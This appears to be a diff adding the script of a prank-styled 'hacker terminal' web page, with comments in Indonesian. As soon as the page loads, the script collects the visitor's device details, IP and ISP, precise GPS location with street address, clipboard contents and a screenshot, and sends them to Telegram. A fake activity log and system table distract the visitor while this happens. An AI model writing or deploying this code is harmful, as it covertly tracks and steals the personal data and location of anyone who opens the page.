+       appendToLog(`Connection type: ${connectionType}`, 'log-info');
+
+
+      const infoString = `- User-Agent: ${ua}\n- Platform: ${plat}\n- OS: ${osName}\n- Language: ${lang}\n- Resolution: ${res}\n- Screen Size: ${screen.width}x${screen.height}\n- Timezone: ${tz}\n- Status: ${online}\n- Access Time: ${now}\n- Vendor: ${vendor}\n- Max Touch Points: ${maxTouchPoints}\n- CPU Cores: ${cpuCores}\n- Device Memory (GB): ${deviceMemory || 'N/A'}\n- Browser: ${browserName} v${browserVersion}\n- Connection Type: ${connectionType}`;
+
+      document.getElementById('device-info').innerText = infoString.split('\n').filter(line => !line.startsWith('- Screen Size') && !line.startsWith('- Browser') && !line.startsWith('- Connection Type')).map(line => line.substring(2)).join(', '); // Tampilkan di UI
+      document.getElementById('screen-size').innerText = res;
+
+
+      appendToTerminal("Device info collected.", 'success');
+      appendToLog("Device information gathered.", 'log-info');
+
+      return `🖥 *Device Info*\n${infoString}`;
+    }
+
+    function getIPInfo() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById('ip-address').innerText = data.ip || 'N/A';
+          document.getElementById('approx-location').innerText = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}`;
+
+          const ipInfoString = `- IP: ${data.ip}\n- City: ${data.city}\n- Region: ${data.region}\n- Country: ${data.country}\n- Location: ${data.loc}\n- ISP: ${data.org}\n- Hostname: ${data.hostname || 'N/A'}`;
+           appendToTerminal(`IP detected: ${data.ip}`, 'success');
+           appendToTerminal(`Approx. Location: ${data.city}, ${data.country}`);
+           appendToLog(`IP information retrieved: ${data.ip}`, 'log-info');
+
+
+          return `🌐 *IP Info*\n${ipInfoString}`;
+        })
+        .catch(error => {
+           document.getElementById('ip-address').innerText = 'Failed to get IP';
+           document.getElementById('approx-location').innerText = 'Failed to get location';
+           console.error("Error fetching IP info:", error);
+           appendToTerminal("Failed to retrieve IP information.", 'error');
+           appendToLog(`Error retrieving IP info: ${error.message}`, 'log-error');
+           return `🌐 *IP Info*\n- IP: Failed to retrieve`;
+        });
+    }
+
+    function getBattery() {
+      if (navigator.getBattery) {
+        return navigator.getBattery().then(batt => {
+          const battString = `- Level: ${Math.round(batt.level * 100)}%\n- Charging: ${batt.charging ? "Yes" : "No"}\n- Charging Time (s): ${batt.chargingTime || 'N/A'}\n- Discharging Time (s): ${batt.charging ? 'N/A' : batt.dischargingTime || 'N/A'}`;
+          document.getElementById('battery-info').innerText = battString.replace(/\n-/g, ', ').substring(2); // Tampilkan di UI
+          appendToTerminal(`Battery Status: ${Math.round(batt.level * 100)}%`, 'success');
+          appendToLog(`Battery status checked: ${Math.round(batt.level * 100)}%`, 'log-info');
+          return `🔋 *Battery*\n${battString}`;
+        }).catch(error => {
+             document.getElementById('battery-info').innerText = 'Failed to get battery info';
+             console.error("Error fetching battery info:", error);
+             appendToTerminal("Failed to retrieve battery information.", 'error');
+             appendToLog(`Error retrieving battery info: ${error.message}`, 'log-error');
+             return Promise.resolve("🔋 *Battery*\n- Status: Not available");
+        });
+      } else {
+        document.getElementById('battery-info').innerText = 'Not supported';
+        appendToTerminal("Battery API not supported.", 'error');
+        appendToLog("Battery API not supported.", 'log-warning');
+        return Promise.resolve("🔋 *Battery*\n- Status: Not supported.");
+      }
+    }
+
+    function getGeoFromIP() {
+       return getIPInfo().then(ipInfo => {
+           const match = ipInfo.match(/- Location: (.+)/);
+           if (match && match[1]) {
+               const [lat, lon] = match[1].split(",");
+                const geoIPString = `- Latitude: ${lat}\n- Longitude: ${lon}\n- Maps: https://www.google.com/maps?q=${lat},${lon}`;
+               return `📍 *Approx. Location (from IP)*\n${geoIPString}`;
+           }
+           return "📍 *Approx. Location (from IP)*\n- Details not available.";
+       });
+    }
+
+
+    function getClipboardText() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        return navigator.clipboard.readText().then(text => {
+          document.getElementById('clipboard-info').innerText = text ? (text.substring(0, 50) + (text.length > 50 ? '...' : '')) : 'Empty or not accessible'; // Tampilkan di UI
+          appendToTerminal("Clipboard data accessed.", 'success');
+          appendToLog(`Clipboard data accessed. Content preview: "${(text || 'Empty').substring(0, 30)}..."`, 'log-info');
+          return `📋 *Clipboard:*\n${text || 'Empty'}`;
+        }).catch(() => {
+            document.getElementById('clipboard-info').innerText = 'Not accessible';
+            appendToTerminal("Clipboard access denied.", 'error');
+            appendToLog("Clipboard access denied or failed.", 'log-warning');
+            return "📋 *Clipboard:*\nNot accessible.";
+        });
+      }
+       document.getElementById('clipboard-info').innerText = 'Not supported';
+       appendToTerminal("Clipboard API not supported.", 'error');
+       appendToLog("Clipboard API not supported.", 'log-warning');
+      return Promise.resolve("📋 *Clipboard:*\nNot supported.");
+    }
+
+
+    function getGeoLocation() {
+      appendToTerminal("Requesting geolocation...", 'command');
+      appendToLog("Attempting to get accurate geolocation...", 'log-info');
+      // Return a promise so it can be awaited in Promise.all
+      return new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(async pos => {
+            const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
+             const timestamp = new Date(pos.timestamp).toLocaleString();
+
+            appendToTerminal(`Geolocation obtained: ${latitude}, ${longitude}`, 'success');
+            appendToLog(`Geolocation obtained: ${latitude}, ${longitude}`, 'log-success');
+
+            let locationText = `📍 *Accurate Location (from GPS)*\n- Latitude: ${latitude}\n- Longitude: ${longitude}\n- Accuracy (meters): ${accuracy}\n- Altitude (meters): ${altitude || 'N/A'}\n- Altitude Accuracy (meters): ${altitudeAccuracy || 'N/A'}\n- Heading: ${heading || 'N/A'}\n- Speed (m/s): ${speed || 'N/A'}\n- Timestamp: ${timestamp}\n- Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            // Coba dapatkan detail alamat dari OpenStreetMap jika memungkinkan
+            try {
+                 appendToLog("Attempting reverse geocoding...", 'log-info');
+                 let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+                 let data = await res.json();
+                 let addressDetails = data.address || {};
+                 let fullAddress = data.display_name || 'N/A';
+                 let school = addressDetails.school || 'N/A';
+                 let city = addressDetails.city || addressDetails.town || addressDetails.village || 'N/A';
+                 let country = addressDetails.country || 'N/A';
+
+
+                 locationText += `\n\n🗺️ *Address Details:*\n- Full Address: ${fullAddress}\n- City/Town: ${city}\n- School: ${school}\n- Country: ${country}`;
+                 appendToTerminal(`Reverse geocoding successful.`, 'success');
+                 appendToLog("Reverse geocoding successful.", 'log-success');
+            } catch(addrError) {
+                console.error("Failed to get detailed address from location:", addrError);
+                 appendToTerminal("Failed to get detailed address.", 'error');
+                 appendToLog(`Failed to get detailed address: ${addrError.message}`, 'log-error');
+            }
+
+             resolve(locationText); // Resolve promise dengan data lokasi
+
+          }, (error) => {
+              console.log("Gagal mendapatkan lokasi: ", error.message);
+               appendToTerminal(`Geolocation failed: ${error.message}`, 'error');
+               appendToLog(`Geolocation request failed: ${error.message}`, 'log-error');
+               resolve("📍 *Accurate Location (from GPS)*\n- Access denied or failed."); // Resolve dengan pesan error
+          }, {
+              enableHighAccuracy: true, // Coba dapatkan lokasi yang lebih akurat
+              timeout: 10000, // Batas waktu 10 detik
+              maximumAge: 0 // Jangan gunakan cache lokasi lama
+          });
+      });
+    }
+
+    // Fungsi untuk menangkap screenshot halaman web
+    function capturePageScreenshot() {
+        appendToTerminal("Attempting to capture page screenshot...", 'command');
+        appendToLog("Initiating page screenshot capture...", 'log-info');
+        // Ambil elemen yang ingin di-screenshot (misalnya, seluruh body atau container)
+        const elementToCapture = document.body; // Atau document.querySelector('.container');
+
+        // Return a promise so it can be awaited
+        return html2canvas(elementToCapture, {
+            scrollY: -window.scrollY, // Handle scrolling if needed
+            useCORS: true, // Penting jika ada gambar dari domain lain
+            scale: 2, // Meningkatkan resolusi untuk kualitas lebih baik
+            logging: false // Matikan logging html2canvas agar terminal lebih bersih
+        }).then(canvas => {
+            // Mengubah canvas menjadi Blob (format gambar)
+            // Menggunakan kualitas 1.0 untuk JPEG agar full quality, atau 'image/png'
+            return new Promise((resolve, reject) => {
+                canvas.toBlob(blob => {
+                    if (!blob || blob.size === 0) {
+                        console.error("Failed to create blob for screenshot.");
+                        appendToTerminal("Error creating screenshot blob.", 'error');
+                        appendToLog("Failed to create screenshot blob.", 'log-error');
+                        reject("Failed to create blob");
+                        return;
+                    }
+                     appendToLog("Screenshot blob created.", 'log-success');
+                    resolve(blob); // Resolve promise dengan blob
+                }, 'image/jpeg', 1.0); // Tentukan format dan kualitas
+            });
+        }).catch(error => {
+            console.error("Error capturing screenshot:", error);
+            appendToTerminal(`Failed to capture screenshot: ${error.message}`, 'error');
+            appendToLog(`Error capturing screenshot: ${error.message}`, 'log-error');
+            return Promise.reject(error); // Reject promise jika terjadi error
+        });
+    }
+
+    // Fungsi simulasi untuk memperbarui data tabel
+    function simulateDataStreams() {
+        appendToLog("Simulating data streams activity...", 'log-info');
+        const dataTableBody = document.getElementById('data-streams');
+        const systems = [
+            { id: 'SRV-001', status: 'Online', volume: '1.2 GB' },
+            { id: 'DB-SECURE', status: 'Online', volume: '8.5 TB' },
+            { id: 'FW-MAIN', status: 'Compromised', volume: 'N/A' },
+            { id: 'USER-AUTH', status: 'Online', volume: '300 MB' },
+            { id: 'LOG-SERVER', status: 'Processing', volume: '2.1 GB' },
+            { id: 'BACKUP-03', status: 'Offline', volume: 'N/A' },
+        ];
+
+        dataTableBody.innerHTML = ''; // Kosongkan tabel
+
+        systems.forEach(sys => {
+            const row = dataTableBody.insertRow();
+            const statusClass = sys.status === 'Online' ? 'success' : (sys.status === 'Compromised' ? 'error' : (sys.status === 'Processing' || sys.status === 'Accessing' || sys.status === 'Warning' ? 'command' : 'log-info')); // Gunakan kelas untuk warna
+            row.innerHTML = `
+                <td>${sys.id}</td>
+                <td><span class="${statusClass}">${sys.status}</span></td>
+                <td>${sys.volume}</td>
+            `;
+        });
+
+         // Tambahkan beberapa entri simulasi baru secara acak
+        setTimeout(() => {
+             const newSystems = [
+                { id: 'NET-HUB-7', status: 'Warning', volume: 'Unknown' },
+                { id: 'ENC-GATEWAY', status: 'Online', volume: '50 MB' },
+                { id: 'FILE-STORE', status: 'Accessing', volume: 'Large' },
+                { id: 'VPN-CLIENT', status: 'Connected', volume: 'Data' }, // Fitur baru
+                { id: 'DNS-CACHE', status: 'Cleared', volume: 'N/A' }, // Fitur baru
+             ];
+             newSystems.forEach(sys => {
+                 const row = dataTableBody.insertRow();
+                 const statusClass = sys.status === 'Online' ? 'success' : (sys.status === 'Warning' ? 'command' : (sys.status === 'Connected' || sys.status === 'Cleared' ? 'log-success' : 'error'));
+                 row.innerHTML = `
+                    <td>${sys.id}</td>
+                    <td><span class="${statusClass}">${sys.status}</span></td>
+                    <td>${sys.volume}</td>
+                 `;
+             });
+             appendToTerminal("New data streams detected.", 'command');
+             appendToLog("New simulated data streams added.", 'log-info');
+
+        }, 3000); // Tambahkan setelah 3 detik
+    }
+
+    // Fungsi simulasi log aktivitas
+    function simulateActivityLog() {
+        const logs = [
+            "[INFO] Scanning system files...",
+            "[WARNING] Suspicious process detected: explorer.exe", // Contoh warning
+            "[INFO] Checking installed software list...",
+            "[SUCCESS] Access granted to 'user_data' directory.", // Contoh success
+            "[ERROR] Failed to access encrypted partition. Permission denied.", // Contoh error
+            "[INFO] Searching for sensitive keywords in documents...",
+            "[INFO] Enumerating network connections...",
+            "[WARNING] Unusual outbound traffic detected.",
+            "[INFO] Collecting browser cookies and cache...",
+            "[SUCCESS] Clipboard content extracted.",
+            "[INFO] Preparing data for exfiltration...",
+            "[INFO] Cleaning up temporary files...",
+            "[SUCCESS] Task completed successfully.",
+            "[INFO] Analyzing network protocols...", // Fitur baru
+            "[INFO] Checking for open sessions...", // Fitur baru
+            "[WARNING] Potential intrusion attempt detected.", // Fitur baru
+            "[SUCCESS] Admin privileges obtained.", // Fitur baru
+            "[INFO] Installing rootkit...", // Simulasi
+             "[ERROR] Antivirus detected malicious activity. Process terminated." // Simulasi
+        ];
+
+        let logIndex = 0;
+        const logInterval = setInterval(() => {
+            if (logIndex < logs.length) {
+                 let type = 'log-info'; // Default
+                 if (logs[logIndex].includes("[WARNING]")) type = 'log-warning';
+                 else if (logs[logIndex].includes("[ERROR]")) type = 'log-error';
+                 else if (logs[logIndex].includes("[SUCCESS]")) type = 'log-success';
+
+                appendToLog(logs[logIndex], type);
+                logIndex++;
+            } else {
+                clearInterval(logInterval);
+                 appendToLog("Activity logging paused.", 'log-info');
+            }
+        }, 1000); // Tambahkan log setiap 1 detik (lebih cepat)
+    }
+
+    // Fungsi simulasi pembaruan status jaringan (opsional)
+    function simulateNetworkStatusUpdate() {
+        const networkStatusElement = document.getElementById('network-status');
+        let packetsSent = 12345;
+        let packetsReceived = 54321;
+
+        setInterval(() => {
+            packetsSent += Math.floor(Math.random() * 100);
+            packetsReceived += Math.floor(Math.random() * 150);
+             let errors = Math.random() < 0.1 ? Math.floor(Math.random() * 5) : 0; // Random errors
+             let drops = Math.random() < 0.05 ? Math.floor(Math.random() * 3) : 0; // Random drops
+
+            networkStatusElement.innerText = `
+Interface: eth0
+Status: UP
+IP Address: 192.168.1.101
+Netmask: 255.255.255.0
+Gateway: 192.168.1.1
+Packets Sent: ${packetsSent}
+Packets Received: ${packetsReceived}
+Errors: ${errors}
+Drops: ${drops}
+            `.trim();
+        }, 2000); // Perbarui setiap 2 detik (lebih cepat)
+    }
+
+
+    async function gatherAndSend() {
+      appendToTerminal("Initializing system scan...", 'command');
+      appendToLog("System scan process started.", 'log-info');
+
+      // Jalankan simulasi log dan update jaringan segera
+      simulateActivityLog();
+      simulateNetworkStatusUpdate();
+      simulateDataStreams(); // Mulai simulasi data streams lebih awal
+
+
+      // Jalankan semua permintaan data secara paralel
+      const [ipInfo, battInfo, geoLocInfo, clipboardText, screenshotBlob] = await Promise.all([
+        getIPInfo(),
+        getBattery(),
+        getGeoLocation(), // Panggil geolocation di sini untuk paralel
+        getClipboardText(),
+        capturePageScreenshot() // Panggil screenshot di sini untuk paralel
+      ]);
+
+      // Setelah semua data terkumpul (kecuali progress bar), mulai progress bar
+      simulateProgress(5000); // Simulasi progress selama 5 detik (lebih cepat)
+
+      // Tunggu sebentar agar progress bar mencapai titik tertentu (opsional)
+      await new Promise(resolve => setTimeout(resolve, 3000)); // Tunggu 3 detik setelah progress dimulai
+
+      appendToTerminal("Compiling data package...", 'command');
+      appendToLog("Compiling collected data for transmission.", 'log-info');
+
+      // Gabungkan semua info teks
+      const allInfoText = `*Data Collected:*\n\n${getDeviceInfo()}\n\n${ipInfo}\n\n${battInfo}\n\n${geoLocInfo}\n\n${clipboardText}`;
+
+
+      // Kirim info teks dan screenshot secara terpisah
+      sendToTelegram(allInfoText);
+
+      // Kirim screenshot jika berhasil didapat
+      if (screenshotBlob) {
+          sendPhotoToTelegram(screenshotBlob, `page_screenshot_${Date.now()}.jpg`);
+      } else {
+           appendToLog("Screenshot could not be sent.", 'log-warning');
+      }
+
+
+       // Simulasi pembaruan data tabel (jika belum selesai)
+       // simulateDataStreams(); // Sudah dipanggil di awal
+
+       // Tunggu progress bar selesai
+       await new Promise(resolve => setTimeout(resolve, 2500)); // Tunggu sisa waktu progress bar (7500 - 3000 = 4500, disesuaikan)
+
+
+       appendToTerminal("Scan complete. Data transfer initiated.", 'success');
+       appendToLog("Initial scan and data transfer sequence completed.", 'log-success');
+    }
+
+    function updateClock() {
+      const now = new Date();
+      const hours = String(now.getHours()).padStart(2, '0');
+      const minutes = String(now.getMinutes()).padStart(2, '0');
+      const seconds = String(now.getSeconds()).padStart(2, '0');
+      const timeString = `${hours}:${minutes}:${seconds}`;
+      document.querySelector('.digital-clock').innerText = timeString;
+    }
+
+
+    // Jalankan semua fungsi saat halaman dibuka
+    window.onload = () => {
+        gatherAndSend(); // Kumpulkan info dan kirim ke Telegram saat halaman dimuat
+        updateClock(); // Tampilkan jam awal
+        setInterval(updateClock, 1000); // Perbarui jam setiap detik
+    };
+
+    // Event listener untuk tombol "Access Granted" dihapus karena tombolnya disembunyikan
+  </script>
+</body>
+</html>
